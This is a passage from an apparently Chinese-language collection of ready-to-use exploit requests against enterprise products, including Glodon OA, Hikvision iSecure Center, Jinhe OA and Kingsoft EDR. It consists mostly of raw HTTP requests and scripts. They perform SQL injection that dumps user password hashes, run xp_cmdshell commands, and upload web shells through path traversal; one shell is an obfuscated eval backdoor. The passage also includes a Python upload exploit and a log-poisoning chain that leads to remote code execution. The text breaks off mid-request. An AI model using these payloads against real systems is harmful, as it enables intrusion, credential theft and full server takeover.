</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="_47-广联达-linkworks-getimdictionarysql-注入漏洞"><a href="#_47-广联达-linkworks-getimdictionarysql-注入漏洞" class="header-anchor">#</a> 47.广联达 Linkworks GetIMDictionarySQL 注入漏洞</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1 
Host: 
Content-Type: application/x-www-form-urlencoded

key=1' UNION ALL SELECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h2 id="_48-广联达oa-sql注入漏洞"><a href="#_48-广联达oa-sql注入漏洞" class="header-anchor">#</a> 48.广联达oa sql注入漏洞</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>
POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1
Host: xxx.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://xxx.com:8888/Services/Identification/Server/Incompatible.aspx
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: 
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 88

dasdas=&amp;key=1' UNION ALL SELECT top 1812 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><h2 id="_49-广联达oa-后台文件上传漏洞"><a href="#_49-广联达oa-后台文件上传漏洞" class="header-anchor">#</a> 49.广联达oa 后台文件上传漏洞</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>
POST /gtp/im/services/group/msgbroadcastuploadfile.aspx HTTP/1.1
Host: 10.10.10.1:8888
X-Requested-With: Ext.basex
Accept: text/html, application/xhtml+xml, image/jxr, */*
Accept-Language: zh-Hans-CN,zh-Hans;q=0.5
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
Accept: */*
Origin: http://10.10.10.1
Referer: http://10.10.10.1:8888/Workflow/Workflow.aspx?configID=774d99d7-02bf-42ec-9e27-caeaa699f512&amp;menuitemid=120743&amp;frame=1&amp;modulecode=GTP.Workflow.TaskCenterModule&amp;tabID=40
Cookie: 
Connection: close
Content-Length: 421

------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; filename=&quot;1.aspx&quot;;filename=&quot;1.jpg&quot;
Content-Type: application/text

&lt;%@ Page Language=&quot;Jscript&quot; Debug=true%&gt;
&lt;%
var FRWT='XeKBdPAOslypgVhLxcIUNFmStvYbnJGuwEarqkifjTHZQzCoRMWD';
var GFMA=Request.Form(&quot;qmq1&quot;);
var ONOQ=FRWT(19) + FRWT(20) + FRWT(8) + FRWT(6) + FRWT(21) + FRWT(1);
eval(GFMA, ONOQ);
%&gt;

------WebKitFormBoundaryFfJZ4PlAZBixjELj--

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br></div></div><h2 id="_50-海康卫视前台上传"><a href="#_50-海康卫视前台上传" class="header-anchor">#</a> 50.海康卫视前台上传</h2> <p><strong>漏洞描述</strong>
HIKVISION iSecure Center综合安防管理平台是一套“集成化”、“智能化”的平台，通过接入视频监控、一卡通、停车场、报警检测等系统的设备，获取边缘节点数据，实现安防信息化集成与联动，以电子地图为载体，融合各系统能力实现丰富的智能应用。HIKVISION iSecure Center平台基于“统一软件技术架构”先进理念设计，采用业务组件化技术，满足平台在业务上的弹性扩展。该平台适用于全行业通用综合安防业务，对各系统资源进行了整合和集中管理，实现统一部署、统一配置、统一管理和统一调度。海康威视isecure center 综合安防管理平台存在任意文件上传漏洞
<strong>影响版本</strong></p> <p>HIKVISION iSecure Center综合安防管理平台,在野。
<strong>fofa查询语句</strong></p> <p>icon_hash=“-808437027”
app=“HIKVISION-iSecure-Center”</p> <p><strong>漏洞复现</strong></p> <p>EXP/POC：payload.py 脚本 走127.0.0.1:8080 代理，方便burpsuit抓包。</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>#!usr/bin/env python
# *-* coding:utf-8 *-*
import sys
import requests
import string
import random
import urllib3
urllib3.disable_warnings()

proxies = {
    'http': 'http://127.0.0.1:8080', 
    'https': 'http://127.0.0.1:8080', #127.0.0.1:8080 代理，方便burpsuit抓包
}

def run(arg):
    try:
        flag=''.join(random.choices(string.ascii_uppercase + string.digits, k = 9))
        filename=''.join(random.choices(string.ascii_uppercase + string.digits, k = 10))
        vuln_url=arg+&quot;center/api/files;.js&quot;
        headers={'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
                 'Accept': '*/*',
                 'Content-Type': 'application/x-www-form-urlencoded'}
        file = {'file': (f'../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/{filename}.txt', flag, 'application/octet-stream')}
        r = requests.post(vuln_url, files=file, timeout=15, verify=False, proxies=proxies)
        if r.status_code==200 and &quot;webapps/clusterMgr&quot; in r.text:

            payload=f&quot;clusterMgr/{filename}.txt;.js&quot;
            url=arg+payload
            r2 = requests.get(url, timeout=15, verify=False, proxies=proxies)
            if r2.status_code==200 and flag in r2.text:

                print('\033[1;31;40m')
                print(arg+f&quot;:存在海康威视isecure center 综合安防管理平台存在任意文件上传漏洞\nshell地址：{url}&quot;)
                print('\033[0m')



        else:
            print(arg+&quot;:不存在漏洞&quot;)
    except:
        print(arg+&quot;:不存在漏洞&quot;)


if __name__ == '__main__':
    url=sys.argv[1]
    run(url)
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br></div></div><p><strong>burpsuit抓包分析</strong></p> <p>burpsuit 127.0.0.1:8080抓包，抓取post 包一个，get 请求包一个。
payload：请求数据包</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>
POST /center/api/files;.js HTTP/1.1
Host: x.x.x.x
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 258
Content-Type: multipart/form-data; boundary=e54e7e5834c8c50e92189959fe7227a4

--e54e7e5834c8c50e92189959fe7227a4
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/2BT5AV96QW.txt&quot;
Content-Type: application/octet-stream

9YPQ3I3ZS
--e54e7e5834c8c50e92189959fe7227a4--
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><p><strong>payload的返回数据包。</strong></p> <div class="language- line-numbers-mode"><pre class="language-text"><code>HTTP/1.1 200 
Server: openresty/1.13.6.2
Date: Fri, 14 Jul 2023 04:35:23 GMT
Content-Type: application/json;charset=UTF-8
Content-Length: 335
Connection: close
Set-Cookie: JSESSIONID=0A235873FB1C02C345345C0D36A4C709; Path=/center; HttpOnly
Content-Language: en_US
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Expires: 0
Content-Disposition: inline;filename=f.txt

{&quot;code&quot;:&quot;0&quot;,&quot;data&quot;:{&quot;filename&quot;:&quot;../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><p>访问漏洞链接：https://x.x.x.x/clusterMgr/2BT5AV96QW.txt;.js ，查看是否上传成功。</p> <p>因为Hikvision平台使用的中间件为tomcat，修改报文和文件名，所以实现上传哥斯拉生成jsp。
宿主服务器windows和linux都可使用。windows 拿到的账户是system账户，linux为root。
Hikvison账户管理密码的后渗透操作：海康威视综合安防后渗透利用技巧</p> <p>POC2</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /center/api/files;.html HTTP/1.1
Host: 10.10.10.10
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a

------WebKitFormBoundary9PggsiM755PLa54a
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp&quot;
Content-Type: application/zip

&lt;%jsp的马%&gt;
------WebKitFormBoundary9PggsiM755PLa54a--
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p><strong>report 任意文件上传漏洞</strong></p> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /svm/api/external/report HTTP/1.1
Host: 10.10.10.10
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a

------WebKitFormBoundary9PggsiM755PLa54a
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp&quot;
Content-Type: application/zip

&lt;%jsp的马%&gt;

------WebKitFormBoundary9PggsiM755PLa54a--
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p><strong>马儿路径：/portal/ui/login/..;/..;/new.jsp</strong></p> <h2 id="_51-汉得srm-tomcat-jsp-登录绕过漏洞"><a href="#_51-汉得srm-tomcat-jsp-登录绕过漏洞" class="header-anchor">#</a> 51.汉得SRM tomcat.jsp 登录绕过漏洞</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>
/tomcat.jsp?dataName=role_id&amp;dataValue=1
/tomcat.jsp?dataName=user_id&amp;dataValue=1
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p><strong>然后访问后台：/main.screen</strong></p> <h2 id="_52-红帆-oa-注入"><a href="#_52-红帆-oa-注入" class="header-anchor">#</a> 52.红帆 oa 注入</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /ioffice/prg/interface/zyy_AttFile.asmx HTTP/1.1
Host: 10.250.250.5
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,
like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 383
Content-Type: text/xml; charset=utf-8
Soapaction: &quot;http://tempuri.org/GetFileAtt&quot;
Accept-Encoding: gzip, deflate
Connection: close
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soap:Envelope
xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;
xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;&lt;soap:Body&gt;&lt;GetFileAtt
xmlns=&quot;http://tempuri.org/&quot;&gt;&lt;fileName&gt;123&lt;/fileName&gt;&lt;/GetFileAtt&gt; &lt;/soap:Body&gt;&lt;/so
ap:Envelope&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><h2 id="_53-宏景-hcm-codesettree-sql-注入漏洞"><a href="#_53-宏景-hcm-codesettree-sql-注入漏洞" class="header-anchor">#</a> 53.宏景 HCM codesettree SQL 注入漏洞</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>GET
/servlet/codesettree?flag=c&amp;status=1&amp;codesetid=1&amp;parentid=-1&amp;categories=~31~27~20union~20al
l~20select~20~27~31~27~2cusername~20from~20operuser~20~2d~2d HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,
like Gecko) 5bGx5rW35LmL5YWz
Accept-Encoding: gzip, deflate
Connection: close
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h2 id="_54-宏景oa文件上传"><a href="#_54-宏景oa文件上传" class="header-anchor">#</a> 54.宏景OA文件上传</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /w_selfservice/oauthservlet/%2e./.%2e/system/options/customreport/OfficeServer.jsp HTTP/1.1
Host: xx.xx.xx.xx
Cookie: JSESSIONID=C92F3ED039AAF958516349D0ADEE426E
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 417

DBSTEP V3.0     351             0               666             DBSTEP=REJTVEVQ
OPTION=U0FWRUZJTEU=
currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
FILETYPE=Li5cMW5kZXguanNw
RECOR1DID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
originalFileId=wV66
originalCreateDate=wUghPB3szB3Xwg66
FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6
needReadFile=yRWZdAS6
originalCreateDate=wLSGP4oEzLKAz4=iz=66

1
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br></div></div><p>shell:http://xx.xx.xx.xx/1ndex.jsp</p> <h2 id="_55-华天动力oa-sql注入"><a href="#_55-华天动力oa-sql注入" class="header-anchor">#</a> 55.华天动力oa SQL注入</h2> <p>访问</p> <p>http://xxxx//report/reportJsp/showReport.jsp?raq=%2FJourTemp2.raq&amp;reportParamsId=100xxx</p> <p>然后抓包</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /report/reportServlet?action=8 HTTP/1.1
Host: xxxx
Content-Length: 145
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://xxx/
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://xxxx/report/reportJsp/showReport.jsp?raq=%2FJourTemp2.raq&amp;reportParamsId=100xxx
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=D207AE96056400942620F09D34B8CDF3
Connection: close

year=*&amp;userName=*&amp;startDate=*&amp;endDate=*&amp;dutyRule=*&amp;resultPage=%2FreportJsp%2FshowRepo
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><h2 id="_56-金蝶云星空-commonfileserver-任意文件读取漏洞"><a href="#_56-金蝶云星空-commonfileserver-任意文件读取漏洞" class="header-anchor">#</a> 56.金蝶云星空 CommonFileserver 任意文件读取漏洞</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code> GET /CommonFileServer/c:/windows/win.ini
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="_57-金和oa-c6-getsqldata-aspx-sql注入漏洞-poc"><a href="#_57-金和oa-c6-getsqldata-aspx-sql注入漏洞-poc" class="header-anchor">#</a> 57.金和OA C6-GetSqlData.aspx SQL注入漏洞 POC</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /C6/Control/GetSqlData.aspx/.ashx
Host: ip:port 
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36
Connection: close
Content-Length: 189
Content-Type: text/plain
Accept-Encoding: gzip

exec master..xp_cmdshell 'ipconfig'
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><h2 id="_58-金和oa-未授权"><a href="#_58-金和oa-未授权" class="header-anchor">#</a> 58.金和OA 未授权</h2> <ol><li>​漏洞链接</li></ol> <p>http://xx.xx.xx.xx/C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1</p> <ol><li>​ 复现步骤</li></ol> <p>http://xx.xx.xx.xx/C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1%3bWAITFOR+DELAY+'0%3a0%3a5'+--%20and%201=1</p> <h2 id="_59-金盘-微信管理平台-getsysteminfo-未授权访问漏洞"><a href="#_59-金盘-微信管理平台-getsysteminfo-未授权访问漏洞" class="header-anchor">#</a> 59.金盘 微信管理平台 getsysteminfo 未授权访问漏洞</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>/admin/weichatcfg/getsysteminfo
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="_60-金山edr代码执行漏洞"><a href="#_60-金山edr代码执行漏洞" class="header-anchor">#</a> 60.金山EDR代码执行漏洞</h2> <p>开启⽇志
/Console/inter/handler/change_white_list_cmd.php id参数</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /inter/ajax.php?cmd=get_user_login_cmd HTTP/1.1
Host: 192.168.24.3:6868
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101
Firefox/114.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 131
Origin: http://192.168.24.3:6868
Connection: close
Referer: http://192.168.24.3:6868/settings/system/user.php?m1=7&amp;m2=0

{&quot;change_white_list_cmd&quot;:{&quot;ip&quot;:&quot;{BD435CCE-3F91EC}&quot;,&quot;name&quot;:&quot;3AF264D9-
AE5A&quot;,&quot;id&quot;:&quot;111;set/**/global/**/general_log=on;&quot;,&quot;type&quot;:&quot;0&quot;}}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><p>设置日志php文件</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /inter/ajax.php?cmd=get_user_login_cmd HTTP/1.1
Host: 192.168.24.3:6868
Content-Length: 195
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML,
like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.24.3:6868
Referer: http://192.168.24.3:6868/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: SKYLARa0aedxe9e785feabxae789c6e03d=tf2xbucirlmkuqsxpg4bqaq0snb7
Connection: close

{&quot;change_white_list_cmd&quot;:{&quot;ip&quot;:&quot;{BD435CCE-3F91EC}&quot;,&quot;name&quot;:&quot;3AF264D9-
AE5A&quot;,&quot;id&quot;:&quot;111;set/**/global/**/general_log_file=0x2e2e2f2e2e2f436f6e736f6c652f6368656
36b5f6c6f67696e322e706870;&quot;,&quot;type&quot;:&quot;0&quot;}}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><p>写入php代码</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /inter/ajax.php?cmd=settings_distribute_cmd HTTP/1.1
Host: 192.168.24.3:6868
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101
Firefox/114.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 222
Origin: http://192.168.24.3:6868
Connection: close
Referer: http://192.168.24.3:6868/index.php
{&quot;settings_distribute_cmd&quot;:{&quot;userSession&quot;:&quot;{BD435CCE-3F91-E1AA-3844-
76A49EE862EB}&quot;,&quot;mode_id&quot;:&quot;3AF264D9-AE5A-86F0-6882-DD7F56827017&quot;,&quot;settings&quot;:&quot;3AF264D9-
AE5A-86F0-6882-DD7F56827017_0&quot;,&quot;SC_list&quot;:{&quot;a&quot;:&quot;&lt;?php phpinfo();?&gt;&quot;}}}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><p>最后get请求rce：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>http://192.168.24.3:6868/check_login2.php
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="_61-金山终端安全系统v9任意文件上传漏洞"><a href="#_61-金山终端安全系统v9任意文件上传漏洞" class="header-anchor">#</a> 61.金山终端安全系统V9任意文件上传漏洞</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /inter/software_relation.php HTTP/1.1 
Host: 192.168.249.137:6868 
Content-Length: 1557 
Pragma: no-cache 
Cache-Control: no-cache 
Upgrade-Insecure-Requests: 1 
Origin: http://192.168.249.137:6868 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxRP5VjBKdqBrCixM 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) 
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9 
Accept-Encoding: gzip, deflate 
Accept-Language: zh-CN,zh;q=0.9 
Connection: close 

------WebKitFormBoundaryxRP5VjBKdqBrCixM 
Content-Disposition: form-data; name=&quot;toolFileName&quot; 

../../datav.php 
------WebKitFormBoundaryxRP5VjBKdqBrCixM 
Content-Disposition: form-data; name=&quot;toolDescri&quot; 

------WebKitFormBoundaryxRP5VjBKdqBrCixM 
Content-Disposition: form-data; name=&quot;id&quot; 

------WebKitFormBoundaryxRP5VjBKdqBrCixM 
Content-Disposition: form-data; name=&quot;version&quot; 

------WebKitFormBoundaryxRP5VjBKdqBrCixM 
Content-Disposition: form-data; name=&quot;sofe_typeof&quot; 

------WebKitFormBoundaryxRP5VjBKdqBrCixM 
Content-Disposition: form-data; name=&quot;fileSize&quot; 

------WebKitFormBoundaryxRP5VjBKdqBrCixM 
Content-Disposition: form-data; name=&quot;param&quot; 

------WebKitFormBoundaryxRP5VjBKdqBrCixM 
Content-Disposition: form-data; name=&quot;toolName&quot; 

------WebKitFormBoundaryxRP5VjBKdqBrCixM 
Content-Disposition: form-data; name=&quot;toolImage&quot;; filename=&quot;3.php&quot; 
Content-Type: image/png 

